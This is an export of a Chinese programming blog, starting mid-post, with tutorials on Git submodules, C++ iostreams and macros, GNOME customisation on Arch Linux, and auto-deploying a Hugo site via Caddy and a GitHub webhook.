\u003ctag\u003e ，如果需要一次性推送所有标签，可以加上 --tags 选项：git push 远程 --tags 。\nGit子模块 Git子模块可以在主项目对子项目有依赖关系时使用，此时主项目不必关心子项目实际开发，因为主项目和子项目可以是不同仓库，只是主项目引用了子项目。\n添加子模块 为主项目添加子项目可以使用：git submodule add \u003csubmodule url\u003e \u003cpath\u003e ，该操作会在当前主仓库初始化子仓库，当前目录下会多出一个 .gitmodules 文件，显示子模块相关信息，并自动拉取 submodule url 仓库的默认分支最新版本到 path 下。\n如果想使用子模块特定分支可以使用 -b 指定，类似 git clone ：git submodule add -b \u003cbranch\u003e \u003csubmodule url\u003e \u003cpath\u003e 。\n初始化子模块 在第一次添加子模块时会自动拉取，但在新克隆仓库时默认不会拉取子模块，可以在克隆时使用 --recurse-submodules 选项：git clone xxx --recurse-submodules 。也可以在克隆后再手动拉取：git submodule update --init 。\n更新子模块 子模块更新主要有两种情况，一种是子模块内容有更新，一种是子模块远程有内容更新。\n对于第一种情况，子模块内相当于是一个独立仓库，就像正常仓库一样提交并更新即可，对于主项目，默认不会添加子模块更新，需要手动 git add / commit \u003csubmodule\u003e 更新并提交。\n对于第二种情况，在主模块使用 git submodule update 是没用的，因为这只会根据 .gitmodules 文件更新子模块指定版本，要更新需要我们进入子模块目录手动执行 git pull 进行更新。当子模块成功 pull 后，就会回到第一种情况，子模块发生更新，此时根据第一种情况进行版本更新即可。还有一种简便的方法可以一次性更新所有子模块远程：git submodule foreach 'git pull [options]' 。\n删除子模块 删除子模块主要有三个步骤：删除Git中对子模块的引用 ，删除工作区子模块目录 ，提交修改信息 。\ngit deinit \u003csubmodule\u003e [--force] ：force 选项为强制选项，即使子模块工作区有未提交的修改也删除子模块。 git rm \u003csubmodule\u003e ：删除子模块目录。 git commit -m \"删除子模块\" ：主项目提交对子模块的删除信息。 当项目比较复杂，同时希望不同功能需要独立开发或者有独立依赖时，子模块可以起到很好的作用。\n","description":"","tags":["Code","Git","笔记"],"title":"Git基本使用","uri":"/posts/id/b0o5db/"},{"categories":["posts"],"content":"传统C语言程序中，要进行输入输出一般使用 fread 、fwrite 、printf 、scanf 、getc 等函数，使用时需要指定格式或者指定接受长度，很是麻烦。C++在此基础上优化了输入输出的使用（ 当然默认没有进行性能优化就是了，使用倒是很方便 ），提供了一个现代化的、基于 流 的库。\n库基于流的概念，对输入输出设备进行了高度抽象，这样就可以用统一的方式操作控制台输入输出、文件输入输出、内存字节数据的输入输出，借助C++的 运算符重载 与 友元函数 ，甚至能非常方便的对自己定义的类进行输入输出 。标准库多个输入输出类继承结构如下\nIO基类 ios_base 类维护了几种共有的数据状态，包括格式化控制、流打开模式、流状态、流位置、事件与回调等，其他继承自 ios_base 的类也能通用。\n流打开模式 每一个IO流都有默认的打开模式，用于控制流的行为，只读打开的流无法写入，只写打开的流无法读取，流的打开模式有如下几种，你可以通过 | 运算符将多个模式同时指定：\nbinary： 以二进制模式打开 app： 以追加模式打开 in： 只读模式打开 out： 只写模式打开 trunc： 打开后舍弃流原本内容 ate： 打开后指针定位到流结尾 流打开模式一般用在文件流，比如要清空文件并重新写入，可以指定 std::ios::out|std::ios::trunc ，想二进制模式追加内容可以使用 std::ios::binary|std::ios::out|std::ios::ate ，指定 std::in|std::out 便可读写打开了，默认状态下文件是以文本模式打开，除非明确指定二进制模式。\n格式化控制 格式化控制通常用在输出流，控制输出格式，主要控制如下：\ndec 为整数I/O使用十进制底 oct 为整数1/O使用八进制底 hex 为整数1/O使用十六进制底 basefield dec|oct|hex，适用于掩码运算 left 左校正(添加填充字符到右) right 右校正(添加填充字符到左) internal 内部校正(添加填充字符到内部选定点) adjustfield left|right|internal，适用于掩码运算 scientific 用科学记数法生成浮点类型，或若与fixed组合则用十六进制记法 fixed 用定点记法生成浮点类型,或若与scientific组合则用十六进制记法 floatfield scientific|fixed，适用于掩码运算 boolalpha 以字母数字格式插入并释出bool类型 showbase 生成为整数输出指示数字基底的前缀，货币/0中要求现金指示器 showpoint 无条件为浮点数输出生成小数点字符 showpos 为非负数值输出生成国字符 skipws 在具体输入操作前跳过前导空白符 unitbuf 在每次输出操作后冲入输出 uppercase 在具体输出的输出操作中以大写等价替换小写字符 函数 setf(flag[, mask]) 可以设置对应的格式控制标志，也可以在输出中快速使用 std::\u003cflag\u003e 进行设置，比如让 bool 类型输出为 true / flase ,而不是 1/0：std::cout \u003c\u003c std::boolalpha \u003c\u003c true \u003c\u003c std::endl; 有设置自然有取消，函数 unsetf(flag) 可以取消对应标志的设置。\n函数 precision(streamsize) 可以设置浮点数输出精度，比如 precision(3) 可以使之后输出的浮点数保留小数点后 3 位。\n流状态 输入输出流在操作时可能出现问题，用了如下标志标识流当前状态，是好是坏：\ngoodbit 没有错误 badbit 不可恢复错误（一般为操作系统内部错误） failbit 输入/输出操作错误（格式化或者其他错误） eofbit 流到达文件尾部 如果一个流发生错误，则之后所有IO操作都会直接失败，所以要及时处理流错误，避免后续操作无法继续。流操作通常返回对当前对象的引用，可以直接把对象当做 bool 类型使用，这时会自动判断当前流是否可用。\n要单独检查某个流状态可以使用对应的函数：bad() 、fail() 、eof() ，good() 在没有其他错误时返回 true 。还支持手动更改或获取流状态，使用 setstate(iostate) 函数可以设置流状态，使用 rdstate() 函数可以获取当前流状态，使用 clear() 函数可以清除流错误，注意不是清空流内容 !\n流位置 对流进行操作时，有一个指针指示流当前操作位置，操作流位置可以实现对流的某部分精确读取和写入。\nbeg 流开始位置 cur 流当前位置 end 流结尾位置 流缓冲 每一个 输入流 都默认有一个缓冲区，用来保存要输出的信息。至于为什么要加缓冲区，对于控制台和文件这类输出设备，每次调用输出如果没有缓冲，底层会调用一次 系统调用 ，而系统调用相对于普通函数调用是很耗时的，通过缓冲区，把多个输出合并到一起就可以显著减少系统调用次数，从而提升一部分性能。对于输出缓冲区，以下情况会触发缓冲区清理（实际写入）：\n程序正常结束，会刷新缓冲区内容（程序异常终止不会刷新，所以对于错误日志这种要及时刷新）。 缓冲区满，此时多余数据没地方存储，自然需要刷新。 调用 std::endl 、std::ends() 、flush() 等显式刷新。 与输出流关联的流状态改变。 默认情况，输入流采用 行缓冲 模式，可以使用 std::unitbuf 操作符来要求输出流，在之后的输出操作中，每次都及时进行刷新，也就是 无缓冲 模式，使用 std::nounitbuf 操作符来恢复行缓冲。\n流关联 当一个输入流被关联到一个输出流时，任何对输入流操作之前都会先刷新输出流，标准库默认将 cin 与 cout 关联到一起。函数 tie() 可以获取与当前流关联的流，函数 tie(std::basic_ostream*) 可以将一个 输出流 与当前流关联，你可以将一个输入流与另一个输出流关联，也可以将一个输出流与另一个输出流关联。\n控制台输入输出流 输出流 为使用方便，标准库为控制台 标准输出 和 标准错误 定义了几个全局对象，标准输出：cout 和 wcout ，标准错误（无缓冲）：cerr 和 wcerr ，标准错误（有缓冲）：clog 和 wclog 。其中有无 w 区别于是否为宽字符（windows搞独立）。\n标准库还重载了流符号 \u003c\u003c ，可以很方便的输出各种标准类型，而不用像 C 语言中那样每个类型都需要对应占位符，如果要使用流输出自定义类型，也可以在自定义类中重载流符号用于输出：\n1 2 3 4 5 6 7 8 9 10 11 class MyType{ ... } // 无论输出还是输入流，在进行输出、输入时都会改变对象内部状态， // 故不能把对象声明为 const ！ friend ostream\u0026 operator \u003c\u003c (ostream\u0026 out, MyType\u0026 type) { out \u003c\u003c \"name: \" \u003c\u003c type.name \u003c\u003c std::endl; return out; } 可以使用函数 put(char_type) 向输出流插入一个字符，也可使用 write(char_type*, streamsize) 向流插入支付块。\n使用 tellp() 可以获取当前流操作指针位置，使用 seekp(pos_type) 和 seekp(off_type, seekdir) 指定流操作指针位置。\n使用函数 flush() 将输出与底层数据进行同步。\n输入流 同输出流，标准库也定义了全局对象 cin 和 wcin 表示标准输入流。\n使用流操作符 \u003e\u003e 可以从标准输入流读取数据到指定变量，要读取到自定义类型，也需要自己重载流操作符，并声明为友元函数。\n函数 get 可以读取一个字符，也可读取一段字符，也可读取到其他内存流对象。函数 unget() 可以撤销一个读取的字符，与读取一个字符恰好相反。\n函数 getline 默认可以读取一行字符（会读取掉输入缓冲区中的换行符，但时不写入读取的镀对象中），也可自定义分割的字符，遇到指定字符不再进行读取，类似读取一行。\n函数 read(char_type*, streamsize) 可以读取一块字符。\n函数 ignore 无参数调用可以忽略流中内容一次，除非遇到流尾部，也可在第一个参数指定需要忽略的次数，在第二个参数指定停止符号，这里忽略是指消费掉输入缓冲区字符，不读入其他对象。\n文件输入输出流 文件输入输出同控制台输入输出本质是差不多的，一个是 C++ 对这几个目标设备进行了操作上的统一，一个是在Linux下，无论标准输入、输出、错误还是普通文件都算上是文件操作，只不过标准输入只能读取无法写入，标准输出和错误只能输出不能输入。而控制这个权限的便是流的打开模式，fstream 默认以读写模式打开，既可读取也可写入，ifstream 默认以只读模式打开，只能读取，ofstream 默认以只写模式打开，只能写入，也可在打开文件时指定其他模式。\n传统 C 库 fopen 打开的文件句柄都需要在不需要使用之后使用 fclose 进行关闭，不过利用 C++ 的类，现在使用文件不用担心关闭文件问题了，在对象离开作用域后会自动关闭关联的文件。你也可以手动调用 close() 函数提前关闭文件。\n函数 rdbuf() 可以返回底层未处理的文件设备对象指针。\n内存字符流 标准库有一个 sstream 头文件，里面包含了对字符串的流操作，可以像操作流一样操作内存中的字符，与其他流一样，字符流也有输入、输出流之分，使用方法与其他流类似。\n函数 str() 可以返回获取或者设置底层字符串对象内容，函数 rdbuf() 可以返回未经处理的底层字符串指针。\n1 2 3 4 5 6 7 8 9 stringstream ss; ss \u003c\u003c \"Hello \" \u003c\u003c \"World -- \" \u003c\u003c 12; ss.str().push_back('a'); cout \u003c\u003c ss.str() \u003c\u003c std::endl; cout \u003c\u003c ss.rdbuf() \u003c\u003c std::endl; ============== 输出 ===================== Hello World -- 12a Hello World -- 12a 关于C++控制台输入输出流效率问题 已经有人研究过这个问题了，主要效率在于 C++ 的 endl ，默认输入输出流关联 tie() 以及 cout 和 printf 兼容，要想 cout 与 printf 性能一致，只需要进行如下设置：\n关闭 cout 与 printf 的兼容性：std::ios::sync_with_stdout(false);\n需要注意关闭之后不要 cout 与 printf 混用，不然会格式错乱！\n关闭输入流与输出流的关联：std::cin.tie(0);\n这个是防止在 cin 读取之后，使用 cout 进行数据输出，这样每次读取时都会调用 flush 刷新缓冲区，量大则费性能。\n在需要使用 std::endl 的地方将其替换为 \"\\n\"\nstd::endl 操作类似于 std::cout \u003c\u003c \"\\n\" \u003c\u003c std::flush ，相当于每次调用 endl 都会刷新一次缓冲区。\n","description":"","tags":["Code","C++标准库"],"title":"标准库应用--输入输出流","uri":"/posts/id/utejq/"},{"categories":["posts"],"content":"了解 宏是C++支持的一种语言特性，可以让我们在编译器预处理阶段对源代码进行一些替换。\n概念 C++中使用 #define 定义一个宏，使用 #undef 取消一个宏定义，C++提供了两类宏，一种 object-like 宏，一种 function-like 宏，基本用法如下：\n1 2 3 4 5 6 7 8 9 10 11 // object-like #define MAX_COUNT 10 MAX_COUNT =\u003e 10 // function-like #define ADD(a, b) a + b ADD(1, 2) =\u003e 1 + 2 如果在同一作用域内定义了两个完全一致的宏名（如果为 function-like 宏，则参数列表也应一致），但是替换列表却不相同，ISO 规定这是不正确的，不过不同编译器对于这种情况处理不同，可能会以最后定义的进行替换，也可能直接报错。\n一个宏定义只能定义在一行内，以换行符结尾 ，如果内容太多，需要在多行定义，则需要在每行最后使用 \\ 进行换行转义！\n对于 object-like 宏，宏作用只是在作用域内将源代码中符合宏名的源代码进行替换，比如上面的 MAX_COUNT 替换为 10 ，如果需要根据不同的参数进行某种模式的替换，就需要使用 function-like 宏，比如上面 ADD 宏将宏中与宏参数一致的部分进行替换。一个标准的宏定义如下：\n1 2 3 4 // object-like 宏 #define 宏名 替换列表 换行符 // function-like 宏 #define 宏名([参数列表]) 替换列表 换行符 其中 参数列表 和 替换列表 都是将字符串 token 化后的列表，一个 token 可以看作编译原理中语法标记或者语法符号，一般由 token名 和 一些 属性 组成，，比如数字 1 可以认为是一个整数常量，token 名为 const-integer ，属性值为 1 ，int 可以看作一个标识符，token 名为 identifier ，属性值为 int 。宏在处理时，是按照 token 进行处理，而不是字符串形式进行处理，在 token 化中，空白符主要用于分割，所以多余的空格符对于宏来说是没有意义的，比如：\n1 2 3 4 #define MAX_COUNT 10 MAX_COUNT =\u003e 10 宏操作 C++ 宏有几个主要操作，分别为 # （token字符串化） 和 ## （token连接）。\n将 function-like 宏参数字符串化，可以使用 # ，例如：\n1 2 3 4 5 #define LOGW(err) fprintf(stderr, \"Warning\" #err \"\\n\") LOGW(This is a warn logmsg) =\u003e fprintf(stderr, \"Warning\" \"This is a warn logmsg\" \"\\n\") // 最后因为字符串合并为：fprintf(stderr, \"WarningThis is a warn logmsg\\n\") 注意：\n# 操作符不只是简单的添加双引号，还会自动对特殊字符转义（就算参数使用双引号，也会被自动转义）。 # 操作符只能对 function-like 宏参数使用。 由于参数会被 token 化，前后多余空格会被压缩成一个。 function-like 宏参数使用 , 分隔，所以上面例子中参数不能出现 , 。 如果要将两个 token 合并为一个，则 ## 将派上用场，利用 ## ，可以动态生成名称或者函数，比如：\n1 2 3 4 5 6 7 8 9 #define CUSTOM_FUNC_NAME(T, N) _$_## T ##_## N ##_custom_func$_ #define GETTER(T, N) T get_##N (){ return this-\u003eN; } CUSTOM_FUNC_NAME(int, func1) =\u003e _$_int_func1_custom_func$_ GETTER(int, _num) =\u003e int get__num(){ return this-\u003e_num; } function-like 宏支持可变参数（参数列表数量不固定），在参数列表指定 ... ，要在替换列表中使用可变参数可以使用 __VA_ARGS__ ，遗憾的是，宏不支持直接访问其中某个指定参数。\n1 2 3 4 5 6 7 8 9 #define ARGS(...) __VA_ARGS__ ARGS(123 456 789, 123) =\u003e 123 456 789, 123 #define ARGS_1(n, ...) n = __VA_ARGS__ ARGS_1(5, 1,2,3,4,5) =\u003e 5 = 1,2,3,4,5 注意：类函数宏支持不定参数，不过可变参数只能出现在参数列表最后！\n深入 上一节了解了宏的基本用法，这一节深入理解宏的展开过程。\nobject-like 宏的展开 如果替换列表中出现定义的宏，会递归展开，并且是深度优先的递归，比如：\n1 2 3 4 5 6 7 8 9 10 #define a 12 #define b 6 #define c a #define d b c d =\u003e b c =\u003e 6 c =\u003e 6 a =\u003e 6 12 由于是深度优先的，所以只有前一个宏完全展开后，下一个宏才能展开，递归必须能终止，所以对于下面这种可能出现 无限递归 的情况，必须进行阻止！\n1 2 3 4 5 6 7 #define a b #define b a b =\u003e a =\u003e b =\u003e ? 在宏展开过程中，如果遇到任何已展开的宏，那么会跳过该宏的展开。这很好理解，相当于每次递归展开时，维护一个已展开宏列表，这里我称为 标记列表 ，这个标记列表由父级标记列表加上当前展开宏构成 ，每次展开前观察宏是否已标记，如果没有被标记，则进行展开，并将当前展开宏进行标记，如果待展开宏已被标记，则跳过展开。\n下面代码展示了宏 x 的展开过程：\n#define x x a y b z c #define y x aa #define z y bb // 方括号为标记列表，展示x展开过程 x [] -\u003e 展开x =\u003e x a y b z c [x] -\u003e 展开 y =\u003e x a x aa b z c [x, y] -\u003e y展开完毕，递归返回 =\u003e x a x aa b z c [x] -\u003e y展开递归返回后，上一层y并没有被标记，继续向后展开z =\u003e x a x aa b y bb c [x, z] -\u003e 继续展开 y =\u003e x a x aa b x aa bb c [x, z, y] -\u003e z递归展开完成，返回后没有需要展开的了，x宏展开完成 function-like 宏的展开 类函数宏的展开与类对象宏展开思路是一致的，不过在其基础上增加了参数列表和部分新的规则。大致展开规则如下：\n会先 完全展开 参数列表，如果宏替换列表中被 # 、## 调用，则该参数不会被展开！ 使用展开后参数内容替换替换列表中内容。 会重新扫描新的替换列表，进一步展开宏内容。 每次替换仍然遵循 object-like 宏的标记列表规则，防止无限递归。 使用 function-like 宏时，如果宏名后没有跟括号，则不将其视为宏。 每次展开完成会向后看一个 token ，如果与展开的宏能构成新的宏，则继续进行展开。 对于第3点，下面例子可以体现：\n1 2 3 4 5 6 #define FOO_1 120 #define CAT(x, y) x ## y CAT(FOO_, 1) =\u003e FOO_1 // 展开完成后对替换列表进行一次扫描，FOO_1，继续展开 =\u003e 120 对于第6点，下面例子可以体现：\n1 2 3 4 5 6 #define CAT(x, y) x ## y #define CAT_1(x, y) x ## y 120 CAT(CAT_, 1)(app, le) =\u003e CAT_1(app, le) // 展开完成，向后看一个 token，与新列表组成新的宏，继续展开 =\u003e apple 120 下面的例子可以帮助理解 自指类函数宏 的展开过程：\n1 2 3 4 5 6 7 8 9 10 11 #define FOO_(x) FOO_1(x) #define FOO_1(x) FOO_2(x) + 1 #define FOO_2(x) FOO_1(x) - 1 #define TEST(x) FOO_ ## x (12) FOO_2 TEST(1)(5) =\u003e FOO_1(12) FOO_2(5) // [] =\u003e FOO_2(12) + 1 FOO_2(5) // [FOO_1] =\u003e FOO_1(12) - 1 + 1 FOO_2(5) // [FOO_1, FOO_2], 无法再递归，返回到顶部 -\u003e [] =\u003e FOO_1(12) - 1 + 1 FOO_1(5) - 1 // [FOO_2] =\u003e FOO_1(12) - 1 + 1 FOO_2(5) + 1 - 1 // [FOO_2, FOO_1] 经过上面的介绍，现在看到一个陌生的宏，应该不会太过惊讶了，实在太复杂就拿出画图工具挨个解析一遍就清楚展开步骤了。\n宏的惯用用法 1. 连接宏 从上面 function-like 宏可以了解到，如果宏替换中使用了 # ，则不会对宏参数进行展开，所以一般我们都需要额外包装一层宏，来确保参数可以是另外一个宏，并能对其进行展开：\n1 2 3 4 5 6 7 8 9 10 11 // 用于最后连接 #define __MACRO_CAT(X, Y) X ## Y // 替换列表没有使用 # ，会先对参数进行展开 #define MACRO_CAT(X, Y) __MACRO(X, Y) ------------------------------------------- #define A 你是 #define B 250 MACRO_CAT(A, B) =\u003e MACRO_CAT(我是，250) =\u003e __MACRO_CAT(我是， 250) =\u003e 我是250 2. 模式匹配宏 用过C++的都知道C++中有分支控制 if 和 switch ，其实宏也能实现类似功能，这就需要利用 连接宏 和一些额外的分支宏来实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 利用连接宏将c展开为对应分支 #define MACRO_IF(c) MACRO_CAT(__MACRO_IF_, c) // 失败分支， 利用可变参数忽略第一个成功分支 #define __MACRO_IF_0(t, ...) __VA_ARGS__ // 成功分支，直接执行第一个分支，忽略失败分支 #define __MACRO_IF_1(t, ...) t #define A() std::cout \u003c\u003c \"I am true\\n\"; #define B() std::cout \u003c\u003c \"I am false\\n\"; ------------------------------------------------ MACRO_IF(1)(\\ A(),\\ B()\\ ) =\u003e __MACRO_IF_1(A(), B()) =\u003e std::cout \u003c\u003c \"I am true\\n\"; 现在这个宏还比较简陋，只有 c 为 1 或者 0 时才有效。\n当然利用这种方式也能实现 取反 ：\n1 2 3 #define MACRO_NOT(c) MACRO_CAT(__MACRO_NOT_, c) #define __MACRO_NOT_1 0 #define __MACRO_NOT_0 1很 很多开源库里面使用的 XXX 也算是一种模式匹配宏，比如最常见的HTTP状态码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #define HTTP_STATUSCODE_MAP(XX) \\ XX(HTTP_OK, \"Success\", 200) \\ XX(HTTP_NOTFOUND, \"Not Found\", 404) \\ XX(HTTP_ERROR, \"Server Error\", 501) \\ ... template \u003ctypename T\u003e class A{ }; #define XX(enum, msg, code) enum, enum HttpCode { HTTP_STATUSCODE_MAP(XX) }; #undef XX const char* getHttpCodeMsg(HttpCode code) { #define XX(enum, msg, code) case enum: return msg; switch(code) { HTTP_STATUSCODE_MAP(XX) default: return \"\"; } #undef XX } int getHttpCode(HttpCode code) { #define XX(enum, msg, code) case enum: return code; switch(code) { HTTP_STATUSCODE_MAP(XX) default: return 0; } #undef XX } 后续待补充. . .\n","description":"","tags":["Code","C++","笔记"],"title":"关于C++宏的一些用法","uri":"/posts/id/37or0k6/"},{"categories":["posts"],"content":"一个好的桌面环境是可以让人眼前一亮，心情愉悦的，这次以 ArchLinux 为例简单记录一下 Gnome 的美化过程，虽然是以 ArchLinux 为例介绍，但是对于使用 Gnome 的伙伴操作步骤都差不多，不过安装命令需要自行替换为对应发行版安装命令，最后会拥有类似平铺窗口那样的桌面环境。\n安装Gnome桌面 最新的 gnome 显示服务器采用的是 wayland ，目前来说还存在一些兼容性问题，还是采用老牌的 xorg 作为显示管理器。\n安装 xorg Xorg 核心软件包不多，安装这两个就差不多了，以后有需要可以再自行添加。\n1 sudo pacman -S xorg xorg-server 安装 gnome 软件包 gnome 有两个主要的软件包：gnome 和 gnome-extra 。如果喜欢gnome自带的一些软件和游戏，可以考虑额外安装 gnome-extra ，如果不需要，可以选择最小化安装，只需要安装 gnome 一个软件包。\n1 sudo pacman -S gnome 启动显示管理器 gnome 默认会安装 gdm 作为显示管理器，只需要为其添加开机自启动服务，这样开机就会自动进入桌面环境的锁屏界面，而不是黑乎乎的控制台。\n1 sudo systemctl enable gdm 现在可以开启桌面环境了 ：\n1 sudo systemctl start gdm 安装 fcitx5 输入法 默认情况下 ArchLinux 是没有中文输入法的，可以安装 fcitx5 来支持中文输入。\n安装基础软件包以及中文输入法引擎 1 sudo pacman -S fcitx5-im fcitx5-chinese-addons 之后会提示安装多个软件包，一路回车即可。\n配置环境变量 为了输入法在大多数情况下可以正确显示，需要配置环境变量，编辑 ~/.pam_environment （用户环境变量配置，只对当前用户有效，全局配置在 /etc/environment ）文件：\n1 2 3 4 5 6 7 8 vim ~/.pam_environment ---------------------------------- GTK_IM_MODULE=fcitx QT_IM_MODULE=fcitx XMODIFIERS=@im=fcitx INPUT_METHOD=fcitx SDL_IM_MODULE=fcitx ---------------------------------- 设置环境变量后，由于使用的是 gnome 桌面环境，所以无需设置 fcitx5 开机自启动，gnome 会帮我们启动。\n安装输入法皮肤 默认的输入法很难看，可以安装皮肤来让它不那么难看：\n1 sudo pacman -S fcitx5-nord 接下来重启系统，这时输入法便已经启动了，在配置工具里面配置相关皮肤就可以了。\n如果对输入法字典感兴趣可以在输入法设置中找到字典设置，在线导入搜狗输入法词库。\nGnome插件 Gnome 的美化大部分依赖于它的 Shell插件 ，所以需要先安装好shell插件支持：\n1 sudo pacman -S gnome-shell gnome-shell-extensions 要在浏览器中安装插件，需要安装额外的浏览器插件：\n1 2 // 需要有 archlinuxcn 源 yay -S chrome-gnome-shell 使用 chrome 浏览器进入 插件网站 ，寻找插件并启用。\n插件推荐列表：\nAltTab Mod 可以让 alt + tab 只显示当前工作区软件。\nBurn My Windows 可以自定义一些窗口打开和关闭动画。\nDock from Dash 可以让鼠标移动到屏幕底部时显示收藏栏，移开时隐藏。\nGlasa 没有实用效果的有趣插件，状态栏会出现一个眼睛盯着你的鼠标。\nGradient Top Bar For Gnome40+\n让顶部状态栏背景渐变透明，我觉得比全透明好看一些。\nGTK Title Bar 移除非 gtk 程序的标题栏，像平铺窗口一样没有标题栏，更好看了。\nInternet Speed Monitor 状态栏监视网速，同时统计数据使用量。\nNotification Banner Reloaded 自定义 gnome 通知位置和动画，默认的顶部居中太难看了哈哈。\nPannel Corners 恢复 gnome 删除的顶部圆角，效果不大，属于细小优化。\nTray Icons Reloaded 增强型系统托盘，可以将最小化或者后台运行的程序图标放到状态栏，方便查看。\nWorkSpaces Bar 用工作区替换状态栏上原来的活动按钮，很直观的查看当前工作区。\n快捷键配置 gnome 设置快捷键可以配置\n我的主要快捷键配置如下，可以参考，请根据自己使用习惯更改：\n快捷键 功能 Mod4 + \u003c1 - n\u003e 切换工作区 Mod4 + Shift + \u003c1 - n\u003e 移动当前窗口到指定工作区 Mod4 + Up 当前窗口最大化 Mod4 + Down 当前窗口最大化切换 Mod4 + H 最小化当前窗口 Mod4 + Shift + S 区域截图 终端和 NeoVim美化 我使用的自己的配置脚本：仓库地址\n仓库包含了一些终端美化以及Neovim一键配置脚本，可以克隆仓库并使用bash执行 setup.sh 配置：\n1 2 3 git clone https://github.com/ticks-tan/archlinux-dotfile cd archlinux-dotfile bash setup.sh 主题配置 gnome主题可以使用 gnome-tweaks 软件配置，安装：\n1 sudo pacman -S gnome-tweaks 安装好之后，软件列表显示为 优化 ，打开可以对进行一些外观和功能设置。\n图标、主题和光标主题都可以在 gnome-look 网站找到，下载后全局主题可以移动到 /usr/share/themes/ 下 或者 /home/用户名/.local/share/themes/ 下 。光标主题和图标可以移动到 /usr/share/icons/ 下或者 /home/用户名/.local/share/icons/ 下 。\n壁纸网站推荐 wallhaven ，壁纸很多也很好看。\n如果安装了隐藏GTK窗口的插件，可能会出现没法移动或者调整大小的情况，需要到 gnome-tweaks 软件里设置功能键， 这样就可以将鼠标移动到窗口上，然后就可以 功能键 + 鼠标左键移动窗口 ，功能键 + 鼠标右键调整窗口大小。\nQT主题使用 qt5ct 配置，安装：\n1 2 3 sudo pacman -S qt5ct // 设置环境变量，否则可能无法使用 echo \"export QT_QPA_PLATFORMTHEME=qt5ct\" \u003e\u003e ~/.bashrc QT 主题可以配合 Kvantum 使用，Kvantum 主题可以在 kde store 上面找到。\n当然要使用这些主题需要提前安装好 Kvantum ：\n1 sudo pacman -S kvantum 打开软件后安装一个从 kde store 下载的主题，然后选择变更主题， Kvantum 自带的主题也很不错。设置之后，打开 qt5ct 软件，风格下拉选择 Kvantum 即可。\n这时候再打开 QT 开发的软件（包括 QtCreator），界面已经焕然一新了！。\n","description":"","tags":["Linux","日常","美化"],"title":"Gnome美化教程","uri":"/posts/id/26gstgj/"},{"categories":["posts"],"content":"本文记录使用 Debian11 + Caddy2 + Github Webhook 实现 hugo 的服务端部署，最终实现本地编写博客文章，提交到 Github 后服务端自动构建网站实时更新。\n继续之前，需要有以下条件：\n一台 Linux 服务器并能 ssh 连接（本文演示为Debian系统）。 Github 帐号并能访问 Github hugo 使用经验 Cloudflare （可选，免费CDN） 服务器安装Caddy并打上相关补丁 Caddy 是一个使用 Go 语言编写的 http/https 服务器，追求性能和简单配置，支持自动 Let's Encrypt 证书，自动化全站 https ，并提供很多功能性插件，为了使用一些插件，需要我们自己打上插件补丁，并使用 Go 构建。\n安装 Go 参考 Go 官方安装教程即可：Go官方安装教程\n这里以 Debian11 和 v1.19.4 为例介绍：\n1 2 3 4 5 6 7 8 9 10 # 下载Go二进制包 wget https://golang.google.cn/dl/go1.19.4.linux-amd64.tar.gz # 解压Go二进制包 rm -rf /usr/local/go \u0026\u0026 tar -C /usr/local -xzf go1.19.4.linux-amd64.tar.gz # 添加命令到环境变量 echo \"export PATH=$PATH:/usr/local/go/bin\" | tee -a /etc/profile # 加载环境变量 source /etc/profile # 验证Go版本 go version按 安装 Caddy 其他发行版依然请参考官方安装教程：Caddy官方安装教程\ndebian11为例：\n1 2 3 4 5 apt install -y debian-keyring debian-archive-keyring apt-transport-https curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list apt update apt install caddy 官方安装的版本没有自带我们需要的插件，需要自己编译安装，然后替换 /usr/bin/caddy 文件，这里安装官方版本只是为了方便，不需要自己再编写服务和默认配置文件。\nCaddy官方提供了一个 xcaddy ，可以很方便的构建带有插件的 caddy，首先安装 xcaddy：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 创建Go构建目录防止污染环境 mkdir go \u0026\u0026 cd go # 安装 xcaddy，之后会在当前目录初始化一些东西，最后xcaddy会安装在 ./bin/xcaddy go install github.com/caddyserver/xcaddy/cmd/xcaddy@latest # 编译带有Cloudflare dns 和 github webhook插件的caddy ./bin/xcaddy build \\ --with github.com/caddy-dns/cloudflare \\ --with github.com/WingLim/caddy-webhook # 编译完后会在当前目录生成 caddy 文件 # 拷贝到 /usr/bin 下 cp ./caddy /usr/bin/caddy # 验证是否有对应模块 caddy list-modules Caddy配置 Caddy默认配置文件在 /etc/caddy/Caddyfile ，使用你喜欢的文本编辑器写入以下内容（可根据自己情况修改）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 :443, 你的域名 { # 网站根目录 root * /root/blog/public/ # Web文件服务器 file_server # 启用gzip压缩 encode gzip # 日志文件路径 log { output file /root/log/caddy_blog_access.log } # tls设置 tls { # 安装有 cloudflare dns 模块加入这一行 # dns cloudflare Cloudflare访问密钥 protocols tls1.2 tls1.3 ciphers TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 curves x25519 } # blog 这个 route 需要放在其他 route最后，否则其他route可能无法正常工作 route /GithubWebhook { webhook { repo 你的Blog仓库地址 path /root/blog branch 仓库分支 # 本地 ssh key 私钥地址，用于github私有仓库验证，需要无密码 key /root/.ssh/id_rsa # webhook 验证密码 secret ******** # webhook通知后执行的命令，这里用于生成博客网站 command bash -c \"/usr/local/bin/hugo --source=/root/blog --cleanDestinationDir --destination=/root/blog/public \u003e\u003e /root/hugo-build.log\" # 子模块更新 submodule } } } 启动caddy验证是否正常：\n1 caddy run --config /etc/caddy/Caddyfile Github Webhook配置 首先登录 Github 帐号，然后找到你的博客仓库，在 Setting 立马找到 Webhook 选项，新建一个 Webhook ，地址填写 http(s)://你的域名/GithubWebhook ，后面地址要与 Caddy 配置文件中 router 相同。请求类型需要选择 application/json ，否则插件无法解析请求，密钥是你配置文件中 secret 指定的密码。\n现在提交代码到你的仓库，验证一下webhook或者服务端是否有如果没有说明配置成功了！\n本地提交代码后，Github webhook会通知你的服务器，服务器收到请求会更新仓库，然后使用 hugo 